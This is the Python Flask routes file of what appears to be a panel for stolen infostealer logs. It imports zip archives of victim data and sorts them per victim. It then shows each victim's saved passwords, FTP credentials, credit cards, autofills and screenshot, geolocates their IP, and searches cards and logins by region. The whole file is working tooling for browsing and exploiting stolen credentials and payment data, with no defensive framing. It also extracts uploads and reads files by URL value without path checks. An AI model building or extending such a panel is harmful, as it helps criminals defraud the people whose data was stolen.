import base64
import json
import os
import shutil
import zipfile
import time
from app import app, render_template, request, find, redirect, sort_new_files, get_loc, send_file


@app.route('/')
def index():
    return render_template('find_page.html')


# Finder routes
@app.route('/open_user', methods=['GET', 'POST'])
def open_user():
    user_hash = request.form['user-hash']
    return redirect(f'/user_hash/{user_hash}')


@app.route('/find_by_site', methods=['GET', 'POST'])
def find_site_func():
    target = request.form['site_name']
    filters = request.form['filters'].split(',')
    data = find.find_site(keyword=target, filters=filters)
    return render_template('output/output_find_site.html', keyword=target, data=data)


@app.route('/find_ip_by_rg', methods=['GET', 'POST'])
def find_ip_func():
    region = request.form['region']
    filters = request.form['filters'].split(',')
    data = find.find_ip(region=region, username_filters=filters)
    return render_template('output/output_find_ip.html', region=region, data=data)


@app.route('/find_ftp_by_rg', methods=['GET', 'POST'])
def find_ftp_func():
    region = request.form['region']
    filters = request.form['filters'].split(',')
    data = find.find_ftp(region=region, username_filters=filters)
    return render_template('output/output_find_ftp.html', region=region, data=data)


@app.route('/find_log_by_rg', methods=['GET', 'POST'])
def find_log_func():
    region = request.form['region']
    data = find.find_log(region)
    return render_template('output/output_find_log.html', region=region, data=data)


@app.route('/find_card_by_rg', methods=['GET', 'POST'])
def find_card_func():
    region = request.form['region']
    data = find.find_credit(region)
    return render_template('output/output_find_card.html', region=region, data=data)


# Add logs routes
@app.route('/add_logs')
def add_logs_route():
    return render_template('add_logs.html')


@app.route('/add', methods=['GET', 'POST'])
def add_logs_func():
    file = request.files['file-input']
    if file.filename == '':
        return 'No selected file'
    elif not 'zip' in file.filename.rsplit('.', 1)[1].lower():
        return 'Use only zip folders'
    else:
        filename = file.filename
        zip_path = str(os.path.dirname(os.path.abspath(__file__)))[
                   :str(os.path.dirname(os.path.abspath(__file__))).rfind('\\')]
        try:
            with open(zip_path + f'/logs/{filename}', 'wb') as f:
                f.write(file.read())
                f.close()
        except:
            with open(zip_path + f'/logs/{filename}', 'wb+') as f:
                f.write(file.read())
                f.close()

        logs_zip = zipfile.ZipFile(zip_path + f'/logs/{filename}')
        logs_zip.extractall(str(os.path.dirname(os.path.abspath(__file__)))[
                            :str(os.path.dirname(os.path.abspath(__file__))).rfind('\\')] + f'/logs/')
        logs_zip.close()
        os.remove(zip_path + f'/logs/{filename}')
        content_list = logs_zip.namelist()

        ready = ""

        for fname in content_list:
            if not fname in ready and not filename[:filename.rfind('.')] + '/' == fname:
                try:
                    shutil.move(
                        f'{zip_path}//logs//{filename[:filename.rfind(".")]}//{fname[fname.find("/"):fname.find("/", fname.find("/") + 1)]}',
                        f'{zip_path}//logs//')
                    sort_new_files.sort_new(
                        f'{zip_path}//logs//{fname[fname.find("/"):fname.find("/", fname.find("/") + 1)]}')
                    ready += fname
                except Exception as e:
                    try:
                        os.rmdir(
                            f'{zip_path}//logs//{filename[:filename.rfind(".")]}//{fname[fname.find("/"):fname.find("/", fname.find("/") + 1)]}')
                    except:
                        pass
        os.rmdir(zip_path + '\\logs\\' + filename[:filename.rfind('.')])
        return redirect('/')


# User hash
@app.route('/user_hash/<hash>')
def user_hash_info(hash):
    output = {}
    output['user_hash'] = hash
    root_path = str(os.path.dirname(os.path.abspath(__file__)))[
                :str(os.path.dirname(os.path.abspath(__file__))).rfind('\\')]
    # User location
    with open(f'{root_path}/data/users_info.json', 'r') as file:
        json_data = json.load(file)
        file.close()
    for dump in json_data:
        if dump['user_hash'] == hash:
            try:
                output['location'] = get_loc.get_address_by_ip(dump['ip'])
            except:
                output['location'] = ''
                output['ip'] = dump['ip']
    # User info
    try:
        with open(f'{root_path}/logs/{hash}/UserInformation.txt', 'r') as file:
            output['user_info'] = file.read()
            file.close()
    except:
        pass
    # Passwords
    try:
        with open(f'{root_path}/logs/{hash}/Passwords.txt', 'r') as file:
            output['pwd'] = file.read()
            file.close()
    except:
        pass
    # Installed Software
    try:
        with open(f'{root_path}/logs/{hash}/InstalledSoftware.txt', 'r') as file:
            output['installed_soft'] = file.read()
            file.close()
    except:
        pass
    # Ftp
    try:
        with open(f'{root_path}/logs/{hash}/FTP/Credentials.txt', 'r') as file:
            output['ftp'] = file.read()
            file.close()
    except:
        pass
    # Credit cards
    try:
        files = os.listdir(f'{root_path}/logs/{hash}/CreditCards/')
        for fname in files:
            with open(f'{root_path}/logs/{hash}/CreditCards/{fname}', 'r') as file:
                output['credit_card'] = file.read()
                file.close()
    except:
        pass
    # Import auto fills
    try:
        with open(f'{root_path}/logs/{hash}/ImportantAutofills.txt') as file:
            output['auto_fills'] = file.read()
            file.close()
    except:
        pass
    try:
        with open(f'{root_path}/logs/{hash}/Screenshot.jpg', 'rb') as f:
            output['screen'] = base64.b64encode(f.read()).decode()
            f.close()
    except:
        output['screen'] = 'None'
    try:
        lat = float(dict(output['location'])['loc'].split(',')[0])
        lng = float(dict(output['location'])['loc'].split(',')[1])
    except:
        lat = 0
        lng = 0
    return render_template('output/user_output.html',
                           data=output, lat=lat, lng=lng)


@app.route('/download_example')
def download_example():
    root_path = str(os.path.dirname(os.path.abspath(__file__)))[
                :str(os.path.dirname(os.path.abspath(__file__))).rfind('\\')]
    return send_file(root_path + '/static/example/logs.zip', as_attachment=True)